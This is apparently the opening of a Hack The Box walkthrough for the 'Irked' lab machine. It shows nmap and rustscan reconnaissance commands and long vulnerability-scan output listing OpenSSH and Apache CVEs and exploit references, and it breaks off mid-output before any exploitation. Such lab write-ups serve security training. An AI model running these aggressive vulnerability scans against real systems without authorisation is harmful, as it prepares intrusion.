# Irked Walkthrough

![Irked](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Irked/irked.png)

## let first do a fast scan on our machine using nmap 

```
sudo nmap -F -sV 10.10.10.117
```

### Result

```
PORT    STATE SERVICE VERSION 
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 
80/tcp  open  http    Apache httpd 2.4.10 ((Debian)) 
111/tcp open  rpcbind 2-4 (RPC #100000) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## now let's do a berif scan.

```
sudo nmap -A -O -v --script vuln 10.10.10.117
```

### Result

```
PORT    STATE SERVICE VERSION 
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:6.7p1:  
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/ 6.9     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/
*EXPLOIT* 
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT* 
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352 
|       MSF:ILITIES/UBUNTU-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2016-0777/      4.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2016-0777/    *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.2-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.1-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-5.3-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/ 1.9     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/
*EXPLOIT* 
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563 
80/tcp  open  http    Apache httpd 2.4.10 ((Debian)) 
| http-enum:  
|_  /manual/: Potentially interesting folder 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-server-header: Apache/2.4.10 (Debian) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| vulners:  
|   cpe:/a:apache:http_server:2.4.10:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2
*EXPLOIT* 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-8743/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-2161/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-0736/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF
72FC7FDC4755A7  *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743 
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161 
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736 
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183 
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228 
|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11985/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185 
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612 
|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT* 
111/tcp open  rpcbind 2-4 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind 
|   100000  2,3,4        111/udp   rpcbind 
|   100000  3,4          111/tcp6  rpcbind 
|   100000  3,4          111/udp6  rpcbind 
|   100024  1          37175/udp6  status 
|   100024  1          43230/tcp   status 
|   100024  1          43799/tcp6  status 
|_  100024  1          59581/udp   status 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.92%E=4%D=4/7%OT=22%CT=1%CU=32069%PV=Y%DS=2%DC=T%G=Y%TM=624F1E39 
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ( 
OS:SP=105%GCD=1%ISR=10E%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3 
OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W2=7 
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW 
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF 
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= 
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= 
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI 
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) 
 
Uptime guess: 199.639 days (since Mon Sep 20 07:33:52 2021) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=261 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 256/tcp) 
HOP RTT       ADDRESS 
1   274.44 ms 10.10.14.1 
2   272.05 ms 10.10.10.117
```

## we got three port 22,80,111 , i also do a rustscan 

```
sudo rustscan -a 10.10.10.117 -b 100 --range 1-65535 -- -A -O --script=vuln
```

### Result

```
PORT      STATE SERVICE REASON         VERSION 
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:6.7p1:  
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/ 6.9     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/
*EXPLOIT* 
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT* 
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352 
|       MSF:ILITIES/UBUNTU-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2016-0777/      4.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2016-0777/    *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.2-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.1-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-5.3-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/ 1.9     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/
*EXPLOIT* 
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563 
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian)) 
| http-enum:  
|_  /manual/: Potentially interesting folder 
|_http-server-header: Apache/2.4.10 (Debian) 
|_http-jsonp-detection: Couldn't find any JSONP endpoints. 
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php 
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| vulners:  
|   cpe:/a:apache:http_server:2.4.10:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
